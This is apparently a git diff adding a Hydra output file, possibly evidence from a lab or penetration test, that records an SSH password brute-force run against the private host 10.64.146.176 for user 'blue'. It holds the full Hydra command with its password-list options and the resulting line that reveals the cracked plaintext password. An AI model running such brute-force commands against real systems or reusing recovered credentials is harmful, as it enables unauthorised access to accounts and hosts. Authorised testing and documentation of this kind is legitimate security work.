@@ -1,0 +1,2 @@
+# Hydra v9.7 run at 2026-06-29 16:56:52 on 10.64.146.176 ssh (hydra -l blue -P content/passlist_clean.txt -t 4 -f -o evidence/hydra_blue.txt ssh://10.64.146.176)
+[22][ssh] host: 10.64.146.176   login: blue   password: sup3r_p@s$w0rd!23
